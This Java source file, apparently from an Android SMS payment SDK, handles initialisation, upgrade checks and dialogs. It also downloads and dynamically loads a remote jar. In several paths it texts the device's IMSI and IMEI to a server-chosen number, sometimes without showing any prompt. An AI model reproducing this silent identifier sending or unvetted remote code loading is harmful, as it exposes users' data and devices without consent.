package com.legame.paysdk;

import java.io.File;
import java.lang.reflect.Method;
import java.util.List;

import android.annotation.TargetApi;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;


import com.google.gson.Gson;
import com.legame.paysdk.dialog.FailDialog;
import com.legame.paysdk.dialog.SendSMSDialog;
import com.legame.paysdk.dialog.TextDialog;
import com.legame.paysdk.dialog.UpgradeDialog;
import com.legame.paysdk.exception.InitException;
import com.legame.paysdk.models.FirstSmsInfo;
import com.legame.paysdk.models.TipsInfo;
import com.legame.paysdk.models.UpgradeInfo;
import com.legame.paysdk.models.UpgradeJarInfo;
import com.legame.paysdk.network.engine.AutoRegEngine;
import com.legame.paysdk.network.engine.BaseNetEngine;
import com.legame.paysdk.network.engine.CheckUpgradeEngine;
import com.legame.paysdk.network.engine.GetPhoneSmsNetEngine;
import com.legame.paysdk.network.engine.UpgradeJarEngine;
import com.legame.paysdk.network.resultdata.AutoRegResultData;
import com.legame.paysdk.network.resultdata.CheckUpgradeResultData;
import com.legame.paysdk.network.resultdata.FirstSmsResultData;
import com.legame.paysdk.network.resultdata.UpgradeJarResultData;
import com.legame.paysdk.network.task.NetTask;
import com.legame.paysdk.network.task.NetTask.NetTaskListener;
import com.legame.paysdk.network.utils.NetTools;
import com.legame.paysdk.receiver.JarFileDownloadService;
import com.legame.paysdk.service.DownloadService;
import com.legame.paysdk.utils.Config;
import com.legame.paysdk.utils.Constants;
import com.legame.paysdk.utils.DataUtils;
import com.legame.paysdk.utils.LogUtil;
import com.legame.paysdk.utils.ResourceUtil;
import com.legame.paysdk.utils.SmsBasePay;
import com.legame.paysdk.utils.SmsBasePay.MdoPayCallBack;

import dalvik.system.DexClassLoader;

@TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH)
public class InitBusiness {
	private static final String TAG = "InitBusiness";
	public static final String BUSINESS_NAME = "init business";

	private static ProgressDialog sProgressDialog;

	private static String[] mFilePaths = new String[] { Config.DB_DIR,
			Config.DOWNLOAD_DIR, Config.CACHE_DIR };

	public static void startInit(final Context context) throws InitException {
		GlobalVal.sInitFinished = false;
		showWaitingDlg(context);

		if (!Environment.MEDIA_MOUNTED.equals(Environment
				.getExternalStorageState())) {
			sProgressDialog.cancel();
			sProgressDialog = null;
			throw new InitException("SD卡不可用!");
		}

		createDir(context);

		String appid = GlobalVal.getAppId(context);
		if (TextUtils.isEmpty(appid)) {
			sProgressDialog.cancel();
			sProgressDialog = null;
			throw new InitException("appid 为空");
		}

		if (!NetTools.isNetworkAvailable(context)) {
			// Log.i(TAG,"网络连接失败");
			showNetWorkErrorDialog(context);
			return;
		}
		doSdkVersion(context);

		int simArea = GlobalVal.getSimArea(context);
		if (simArea == 0) {
			
		}

		if (UpgradeJarInfo.getUpgradeJar(context).equals("")) {
			UpgradeJarInfo.saveUpgradeJar(context, Constants.SMS_SDK_VERSION);
		}

		if (TextUtils.isEmpty(DataUtils.getDeviceID(context))) {
			LogUtil.d(TAG, "device id not found, do register");
			doAutoRegister(context);
		} else {
			checkUpadteJar(context);
			// checkUpdate(context);
		}
	}

	private static void showWaitingDlg(Context context) {
		if(GlobalVal.getMetadataBoolean(context, "LEYO_NO_SHOW_DIALOG")){
			return;
		}
		sProgressDialog = new ProgressDialog(context);
		sProgressDialog.setCancelable(false);
		sProgressDialog.setMessage("初始化中，请稍候");
		sProgressDialog.getWindow().setType(
				WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
		sProgressDialog.show();
	}

	private static void createDir(Context context) {
		for (int i = 0; i < mFilePaths.length; i++) {
			String filePath = mFilePaths[i];
			if (i == 1) {
				filePath = filePath + File.separator + context.getPackageName();
			}
			File file = new File(filePath);
			if (!file.exists()) {
				file.mkdirs();
			}
		}
	}

	private static void doSdkVersion(Context context) {
		String versionSDK = DataUtils.getSDKVersion(context);
		if ("".equals(versionSDK)) {

		} else {
			if (Constants.SDK_VERSION.compareTo(versionSDK) > 0) {
				GlobalVal.deleteDownloadFile();
			}
		}
		GlobalVal.CopyAssertJarToFile(context, Config.LEYOPAY_SMS,
				Config.LEYOPAY_SMS);
		DataUtils.saveSDKVersion(context, Constants.SDK_VERSION);
	}

	private static void getPhoneNumber(final Context context) {
		DexClassLoader cl = GlobalVal.classRef(context,Config.LEYOPAY_SMS);
		try {
			Class<?> smsGetPhoneNumberClass = cl
					.loadClass("com.legame.leyo.smspay.extend.SmsGetPhoneNumber");
			Method getPhoneNumberMethod = smsGetPhoneNumberClass.getMethod(
					"getPhoneNumber", Context.class);
			getPhoneNumberMethod.invoke(null, context);

		} catch (Exception e) {
			e.printStackTrace();
			GetPhoneSmsNetEngine engine = new GetPhoneSmsNetEngine(GlobalVal.getIMSI(context));
			NetTask netTask = new NetTask(context, engine, 0);
			netTask.setListener(new SmsNetTaskListener(context));
			new Thread(netTask).start();
		}
	}

	private static String smsTip;
	private static void doAutoRegister(final Context context) {
		AutoRegEngine engine = new AutoRegEngine();
		NetTask netTask = new NetTask(context, engine, 1);
		netTask.setListener(new NetTask.NetTaskListener() {
			@Override
			public void onTaskRunSuccessful(int tag, BaseNetEngine engine) {
				// 保存device_id
				AutoRegResultData result = (AutoRegResultData) engine
						.getResultData();
				smsTip = result.getSmsTip();
				if (result.getErrorCode() != 0) {
					LogUtil.d(TAG, "autoregister fail");
					showNetWorkErrorDialog(context);
					return;
				}
				String deviceId = result.getDevId();
				if (TextUtils.isEmpty(deviceId)) {
					LogUtil.d(TAG, "device id is empty");
					showNetWorkErrorDialog(context);
					return;
				}
				DataUtils.saveDeviceID(context, result.getDevId());
				checkUpadteJar(context);
			}

			@Override
			public void onTaskRunError(int tag) {
				LogUtil.d(TAG, "error while autoregister");
				showNetWorkErrorDialog(context);
			}

			@Override
			public void onTaskRunCanceled(int tag) {
				sendCallback(ErrorCode.ERROR_USER_CANCELED, "用户取消");
			}
		});
		new Thread(netTask).start();
	}

	private static void checkUpadteJar(final Context context) {
		UpgradeJarEngine engine = new UpgradeJarEngine(GlobalVal.getIMSI(context));
		NetTask netTask = new NetTask(context, engine, 0);
		netTask.setListener(new JarNetTaskListener(context));
		new Thread(netTask).start();
	}

	private static void checkUpdate(final Context context) {
		CheckUpgradeEngine engine = new CheckUpgradeEngine(GlobalVal.getIMSI(context));
		NetTask netTask = new NetTask(context, engine, 0);
		netTask.setListener(new MyNetTaskListener(context));
		new Thread(netTask).start();
	}


	private static void showNetWorkErrorDialog(final Context context) {
		if (sProgressDialog != null) {
			sProgressDialog.cancel();
			sProgressDialog = null;
		}
		final FailDialog mDialog = new FailDialog(context);
		mDialog.showTitle("初始化提示");
		mDialog.setContent1("网络连接失败");
		mDialog.setContent2(ErrorCode.ERROR_NETWORK_FAILED + "");
		mDialog.setContent3("您的网络出现问题，无法完成初始化，如有疑问，请牢记返回码致电客服："
				+ ResourceUtil.getStringExt(context, "lgsdk_service_tel"));
		mDialog.show();
		mDialog.setCanceledOnTouchOutside(false);// 设置点击屏幕Dialog不消失
		mDialog.showButton1("确定", new View.OnClickListener() {

			@Override
			public void onClick(View v) {
				// ListenerHolder.sInitListener.initFinished(ErrorCode.ERROR_NETWORK_FAILED,
				// "网络连接失败");
				mDialog.dismiss();
				sendCallback(ErrorCode.ERROR_NETWORK_FAILED, "网络连接失败");
			}
		});
	}

	private static String getFileName(String url) {
		int lastSprit = url.lastIndexOf("/");
		int quesMark = url.indexOf("?");

		if (quesMark == -1) {
			return url.substring(lastSprit + 1);
		} else {
			return url.substring(lastSprit + 1, quesMark);
		}
	}

	private static void showUpdateDialog(final Context context,
			final UpgradeInfo info) {
		if (sProgressDialog != null) {
			sProgressDialog.cancel();
			sProgressDialog = null;
		}

		if (!info.getForce()) {
			final TextDialog dialog = new TextDialog(context);
			dialog.getWindow().setType(
					WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
			dialog.setCanceledOnTouchOutside(false);
			dialog.showTitle("升级").setContent("发现新的版本")
					.showButton1("跳过", new View.OnClickListener() {
						@Override
						public void onClick(View v) {
//							showWaitingDlg(context);
							// getBulltin(context);
							
							 sendCallback(ErrorCode.ERROR_SUCCESS, "初始化完成");
							dialog.cancel();
						}
					}).showButton2("升级", new View.OnClickListener() {
						@Override
						public void onClick(View v) {
							sendCallback(ErrorCode.ERROR_SUCCESS, "初始化完成");
							DownloadService.start(
									context.getApplicationContext(),
									info.getDownloadUrl(),
									getFileName(info.getDownloadUrl()), true);
							dialog.cancel();
						}
					}).show();
			return;
		}
		UpgradeDialog dialog = new UpgradeDialog(context, info);
		dialog.getWindow()
				.setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
		dialog.setCanceledOnTouchOutside(false);
		dialog.show();

	}

	private static void sendCallback(final int code, final String msg) {
		if (sProgressDialog != null) {
			sProgressDialog.cancel();
			sProgressDialog = null;
		}

		if (code == ErrorCode.ERROR_SUCCESS) {
			GlobalVal.sInitFinished = true;
		} else {
			GlobalVal.sInitFinished = false;
		}

		GlobalVal.sHandler.post(new Runnable() {
			@Override
			public void run() {
				ListenerHolder.sInitListener.initFinished(code, msg);
			}
		});
	}

	private static class MyNetTaskListener implements NetTaskListener {
		private Context context;

		public MyNetTaskListener(Context context) {
			this.context = context;
		}

		@Override
		public void onTaskRunSuccessful(int tag, BaseNetEngine engine) {
			CheckUpgradeResultData result = (CheckUpgradeResultData) engine
					.getResultData();
			if (result.getErrorCode() != 0) {
				LogUtil.d(TAG, "error whhile check update");
				sendCallback(ErrorCode.ERROR_NETWORK_FAILED,
						result.getErrorTip());
				return;
			}
			final UpgradeInfo info = result.getUpgradeInfo();
			// test update
			// info.setStatus(true);
			// info.setForce(true);
			// info.setDownloadUrl("http://121.201.18.4:8080/download/xmxx_1_leyoutuisong.apk");
			// end of test update
			if (!info.getStatus()) {
				LogUtil.d(TAG, "no updates");
				
				// Log.i(TAG,"运营商类型（0为移动，1为联通，3为电信）=="+GlobalVal.getSimArea(context));

				// 获取当前版本号
				String newVerName = "";
				newVerName = getAppVersionName(context);
				String oldVerName = "";
				oldVerName = loadPreferences(context);
				if (!newVerName.equals(oldVerName)) {
					savePreferences(context, newVerName);
					NetTools.gIsFirstStart = true;
					// Log.i(TAG,"第一次启动程序");
					if (sProgressDialog != null) {
						sProgressDialog.cancel();
						sProgressDialog = null;
					}
					final SendSMSDialog mSendSMSDialog = new SendSMSDialog(
							context);
					mSendSMSDialog.setCanceledOnTouchOutside(false);// 设置点击屏幕Dialog不消失
					mSendSMSDialog.setCancelable(false);
					mSendSMSDialog.showButtonSure("确认",
							new View.OnClickListener() {
								@Override
								public void onClick(View v) {
									getPhoneNumber(context);
									sendCallback(ErrorCode.ERROR_SUCCESS,
											"初始化完成"); 
									mSendSMSDialog.dismiss();
								}
							});
					mSendSMSDialog.showButtonCancle("",
							new View.OnClickListener() {
								@Override
								public void onClick(View v) {
									getPhoneNumber(context);
									sendCallback(ErrorCode.ERROR_SUCCESS,
											"初始化完成");
									mSendSMSDialog.dismiss();
								}
							});
					if(TipsInfo.SHOW.equals(smsTip)){
						mSendSMSDialog.show();
					}else{
						getPhoneNumber(context);
						sendCallback(ErrorCode.ERROR_SUCCESS,
								"初始化完成");
					}
					
					
				} else {
					savePreferences(context, newVerName);
					FirstSmsInfo.saveSdkSmsUpPort(context, info.getPhone());
					if (FirstSmsInfo.getSdkSmsUpPort(context) != null) {
						String phoneNum = FirstSmsInfo.getSdkSmsUpPort(context);
						if (!phoneNum.equals("")) {// 如果不为空，则不再弹出短信确认框
							sendCallback(ErrorCode.ERROR_SUCCESS, "初始化完成");
						} else {// 为空则继续提示用户
								//
								//
								//
							String imei = NetTools.getIMEI(context);
							if (imei == null) {
								imei = NetTools.getLocalMacAddress(context);
							}
							String content = GlobalVal.getIMSI(context) + ","
									+ imei;
							if (!info.getUpport().equals("")) {
								final SmsBasePay smspay = new SmsBasePay();
								smspay.pay(context, info.getUpport(), content,
										new MdoPayCallBack() {
											@Override
											public void onMdoPayResult( 
													int status) {
												// TODO Auto-generated method
												// stub
												if (status == 0) {
													// 静态函数回调结果通知
													LogUtil.d("getphone_Sms",
															"send success");
												} else {
													// 静态函数回调结果通知，这里测试直接回调失败，可以在客户端看到弹框文字结果
													LogUtil.d("getphone_Sms",
															"send failed"); // 客户端显示strExtra内容的警示框
												}

												smspay.unRegisterReceiver(context);
												sendCallback(
														ErrorCode.ERROR_SUCCESS,
														"初始化完成");
											}
										});
							} else {
								sendCallback(ErrorCode.ERROR_SUCCESS, "初始化完成");
							}
						}
					} else {
						sendCallback(ErrorCode.ERROR_SUCCESS, "初始化完成");
					}
				}
			} else {
				if(isTimeToUpdateDialog(context) || info.getForce()){
					showUpdateDialog(context, info);
					DataUtils.saveLongPre(context, Constants.SHOW_UPDATE_DIALOG_TIME, System.currentTimeMillis());
				}else{
					sendCallback(ErrorCode.ERROR_SUCCESS, "初始化完成");
				}
			}
		}

		@Override
		public void onTaskRunError(int tag) {
			showNetWorkErrorDialog(context);
		}

		@Override
		public void onTaskRunCanceled(int tag) {
			sendCallback(ErrorCode.ERROR_USER_CANCELED, "用户取消");
		}
	}
	
	private static boolean isTimeToUpdateDialog(Context context){
		long showUpdateTime = DataUtils.getLongPre(context, Constants.SHOW_UPDATE_DIALOG_TIME);
		if(showUpdateTime == 0){
			return true;
		}
		long currentTime = System.currentTimeMillis();
		return currentTime - showUpdateTime > 1000*60*60*6 ;//限制六个小时
	}

	private static class JarNetTaskListener implements NetTaskListener {
		private Context context;

		public JarNetTaskListener(Context context) {
			this.context = context;
		}

		@Override
		public void onTaskRunSuccessful(int tag, BaseNetEngine engine) {
			UpgradeJarResultData result = (UpgradeJarResultData) engine
					.getResultData();
			if (result.getErrorCode() != 0) {
				LogUtil.d(TAG, "error whhile check update jar");
				sendCallback(result.getErrorCode(), result.getErrorTip());
				return;
			}
			UpgradeJarInfo info = result.getUpgradeInfo();
			// Log.i(TAG,"ifdownload-->"+info.isIfdownload());
			// Log.i(TAG,"ver-->"+info.getVersion_code_jar());
			// Log.i(TAG,"download-url-->"+info.getDown_url());
			if (!info.isIfdownload()) {
				LogUtil.d(TAG, "no updates");
				checkUpdate(context);
			} else {
				if (!TextUtils.isEmpty(info.getVersion_code_jar())) {
					GlobalVal.deleteDownloadFile();
					// Log.i(TAG,"保存现今的功能包版本号以及启动通知栏下载");
					UpgradeJarInfo.saveUpgradeJar(context,
							info.getVersion_code_jar());
					Intent updateIntent = new Intent(context,
							JarFileDownloadService.class);
					updateIntent.putExtra("titleId", "LeyoPay_sms");
					updateIntent.putExtra("url", info.getDown_url());
					context.startService(updateIntent);

					checkUpdate(context);
				} else {
					Log.i(TAG, "ver_code_jar no value");
					sendCallback(ErrorCode.ERROR_NETWORK_FAILED,
							result.getErrorTip());
					return;
				}
			}
		}

		@Override
		public void onTaskRunError(int tag) {
			showNetWorkErrorDialog(context);
		}

		@Override
		public void onTaskRunCanceled(int tag) {
			sendCallback(ErrorCode.ERROR_USER_CANCELED, "用户取消");
		}
	}


	/**
	 * 发送短信获取电话号码
	 * 
	 * @author codeding
	 * 
	 */
	private static class SmsNetTaskListener implements NetTaskListener {
		private Context context;

		public SmsNetTaskListener(Context context) {
			this.context = context;
		}

		@Override
		public void onTaskRunSuccessful(int tag, BaseNetEngine engine) {
			FirstSmsResultData result = (FirstSmsResultData) engine
					.getResultData();
			if (result.getErrorCode() != 0) {
				LogUtil.d(TAG, "error whhile check update");
				// Log.i(TAG,"服务端返回码sms："+result.getErrorCode());
				sendCallback(ErrorCode.ERROR_NETWORK_FAILED,
						result.getErrorTip());
				return;
			}
			final FirstSmsInfo info = result.getFirstSmsInfo();
			// Log.i(TAG,"要发送的端口:"+info.getSdkSmsUpPort());
			if (!info.getSdkSmsUpPort().equals("")) {// 有上行端口
				//
				//
				//
				String imei = NetTools.getIMEI(context);
				if (imei == null) {
					imei = NetTools.getLocalMacAddress(context);
				}
				String content = GlobalVal.getIMSI(context) + "," + imei;
				// Log.i(TAG,"获取手机号码短信内容："+content);
				final SmsBasePay smspay = new SmsBasePay();
				smspay.pay(context, info.getSdkSmsUpPort(), content,
						new MdoPayCallBack() {
							@Override
							public void onMdoPayResult(int status) {
								// TODO Auto-generated method stub
								if (status == 0) {
									// 静态函数回调结果通知
									LogUtil.d("getphone_Sms", "send success");
									// Log.i(TAG,"短信成功发送");
								} else {
									// 静态函数回调结果通知，这里测试直接回调失败，可以在客户端看到弹框文字结果
									LogUtil.d("getphone_Sms", "send failed"); // 客户端显示strExtra内容的警示框
								}
								smspay.unRegisterReceiver(context);
							}
						});
			} else {
				sendCallback(ErrorCode.ERROR_SUCCESS, "初始化完成");
			}
		}

		@Override
		public void onTaskRunError(int tag) {
			showNetWorkErrorDialog(context);
		}

		@Override
		public void onTaskRunCanceled(int tag) {
			sendCallback(ErrorCode.ERROR_USER_CANCELED, "用户取消");
		}
	}

	private static String VerName = "vername";

	// 保存版本号
	private static void savePreferences(Context context, String ver) {
		int mode = Activity.MODE_PRIVATE;
		SharedPreferences gamePreferences = context.getSharedPreferences(
				VerName, mode);
		SharedPreferences.Editor editor = gamePreferences.edit();
		editor.putString("ver", ver);
		editor.commit();
	}

	// 获得已保存的版本号
	private static String loadPreferences(Context context) {
		// Get the stored preferences
		String vername = "";
		int mode = Activity.MODE_PRIVATE;
		SharedPreferences gamePreferences = context.getSharedPreferences(
				VerName, mode);
		vername = gamePreferences.getString("ver", "");
		return vername;
	}

	/**
	 * 返回当前程序版本名
	 */
	private static String getAppVersionName(Context context) {
		String versionName = "";
		try {
			// ---get the package info---
			PackageManager pm = context.getPackageManager();
			PackageInfo pi = pm.getPackageInfo(context.getPackageName(), 0);
			versionName = pi.versionName;
			if (versionName == null || versionName.length() <= 0) {
				return "";
			}
		} catch (Exception e) {
			Log.e("VersionInfo", "Exception", e);
		}
		return versionName;
	}
}
